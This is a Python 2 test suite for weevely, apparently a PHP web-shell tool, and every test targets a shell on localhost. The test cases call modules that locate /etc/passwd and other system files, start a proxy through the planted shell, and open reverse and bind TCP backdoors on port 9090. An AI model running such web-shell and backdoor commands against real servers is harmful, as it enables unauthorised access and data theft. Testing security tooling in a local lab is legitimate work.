from commands import getstatusoutput as run
from os import system as run_bg
from re import search, DOTALL


class TestException(Exception):
    pass


url = 'http://localhost/we.php'
pwd = 'asdasd'
urlpwd = '%s %s' % (url, pwd)
writable_dir = 'writable'
http_proxy = "http://localhost:8080"
bd_tcp_port = 9090

scripts = {
           
           '/tmp/tempscript' : """# comment
:shell.php 'print("OK test");'
""",

            '/tmp/proxyscript' : """:set shell.php proxy='%s'
:shell.php 'print("OK test");'
:system.info client_ip
""" % (http_proxy),

            '/tmp/proxybrokescript' : """:set shell.php proxy='%s'
:shell.php 'print("OK test");'
""" % (http_proxy[:-1])
           
           }


class TG(list):
    
    def __init__(self, description, TCs):
        
        self.description = description
        
        list.__init__(self)
        
        self.extend(TCs)

        
    def test(self):
        
        print '\n[+] %s\n' % self.description
        
        for tc in self:
            tc.test()

class TC:
    def __init__(self, params, expected_output, expected_status = None, negate=False, printout=False, background=False):
        self.params = params
        self.output = '.*%s.*' % expected_output
        self.status = expected_status
        self.negate = negate
        self.printout = printout
        self.background = background

    def outp_format(self, out):
        
        return ' \n===============================\n%s\n===============================\n' % out

    def test(self):
            
        result = 'KO'
            
        if self.background:
            cmd_string = './weevely.py %s &' % (' '.join(self.params))
            if not self.printout:
                cmd_string = '(%s) > /dev/null' % cmd_string
            run_bg(cmd_string)
            result = 'BG'
        else:
            cmd_string = './weevely.py %s' % (' '.join(self.params))
            status, output = run(cmd_string)
            if self.negate != bool(search(self.output, output, flags=DOTALL)):
                result = 'OK'

        print '[%s] %s' % (result, cmd_string) 

        if result == 'KO':
            raise TestException('Test failed. Expected output: "%s"\n %s' % (self.output, self.outp_format(output)))
        
        if self.printout:
            print self.outp_format(output)
           
        


TS = [
      
      TG('Test "show"',
        [
        TC([ 'show',  'generate.asd' ],'Error'),                # show with existant mod
        TC([ 'show', 'sql.dump' ],'Error', negate=True),        # show good mod
        TC([ 'show', ':sql.dump' ],'Error', negate=True),       # show good :mod
        TC([ urlpwd, ':show sql.dump' ],'Error', negate=True),   # show good mod cmdline
        TC([ urlpwd, ':show :sql.dump' ],'Error', negate=True),   # show good :mod cmdline
        TC([ urlpwd[3:], ':show sql.dump' ],'Error', negate=True)   # show wrong url cmdline
        ]),
      
      TG('Test "set"',
        [
        TC([ urlpwd, ':set shell.sh cmd\=ls' ],'cmd=ls'),   # set variable with =
        TC([ urlpwd, ':set shell.sh ls' ],'cmd=ls'),   # set variable without =
        TC([ urlpwd, ':set shell.sh cmmd=ls' ],'invalid parameter'),   # set with good :mod cmdline
        TC([ urlpwd[3:], ':set shell.php verbose=True' ],'Error'),   # set with wrong url cmdline
        TC([ urlpwd, ':set sad.asd.ds verbose=True' ],'Error')   # set with non existant mod
        ]),
      

      TG('Test "load"',
        [
        TC([ urlpwd, ':load /tmp/tempscript' ],'\nOK test'),   # load working script
        TC([ urlpwd[:-1], ':load /tmp/tempscript' ],'\nOK test', negate=True),   # bad connection
        TC([ urlpwd, ':load /tmp/asd' ],'Error opening'),   # load unexistant script
        ]),
      
      
      TG('Test "find.name"',
        [
        TC([ urlpwd, ':find.name ci %s .' % (writable_dir[2:-1].upper())], writable_dir),   # find if contains case insensitive
        TC([ urlpwd, ':find.name c %s' % (writable_dir[2:-1]) ], writable_dir),   # find if contains 
        TC([ urlpwd, ':find.name ei %s' % (writable_dir.upper()) ], writable_dir),   # find if equal case insensitive
        TC([ urlpwd, ':find.name e %s' % (writable_dir) ], writable_dir),   # find if equal 
        TC([ urlpwd, ':find.name ci ESOLV.CONF /etc/' ], 'resolv.conf'),   # find if contains case insensitive out of webroot
        ]),
      
      TG('Test "find.perms"',
        [
        TC([ urlpwd, ':find.perms first d w vector=ndee' ], 'Error, allowed values'),   # find with wrong vector
        TC([ urlpwd, ':find.perms first d w vector=find' ], writable_dir),   # find first writable dir
        TC([ urlpwd, ':find.perms any f x /sbin/ vector=find' ], 'insmod'),   # find executable directory in /sbin/
        TC([ urlpwd, ':find.perms any f r /etc/' ], 'passwd')   # find any readable files
        ]),      
      
      TG('Run background :net.proxy, set and use it to connect through',
        [
        TC([ urlpwd, ':net.proxy' ],'', background=True),   # start proxy in background
        TC([ urlpwd, ':load /tmp/proxyscript' ],'\nOK test'),   # execute some command through proxy
        TC([ urlpwd, ':load /tmp/proxybrokescript' ],'Connection refused'),   # set wrong proxy
        ]),      
      
      TG('Open TCP backdoors and check',
        [
        TC([ urlpwd, ':backdoor.reverse_tcp localhost %i' % (bd_tcp_port) ], '', background=True),   # open reverse tcp shell in background
        TC([ urlpwd, ':backdoor.tcp %i' % bd_tcp_port ],'', background=True),   # connect with direct tcp 
        TC([ urlpwd, '"netstat -ap | grep %i"' % bd_tcp_port ],'.*\*:%i.*LISTEN.*localhost:%i.*ESTABLISHED.*localhost:%i.*ESTABLISHED.*' % (bd_tcp_port, bd_tcp_port, bd_tcp_port), printout=True) # check with netstat
        
        ])
            
      ] 
       
    
for script_path in scripts:
    fscript = file(script_path,'w')
    fscript.write(scripts[script_path])
    fscript.close()
    print '[+] Created "%s"' % script_path
       
try:
    for tg in TS:       
        tg.test()
except TestException, e:
    print '[!] %s' % str(e)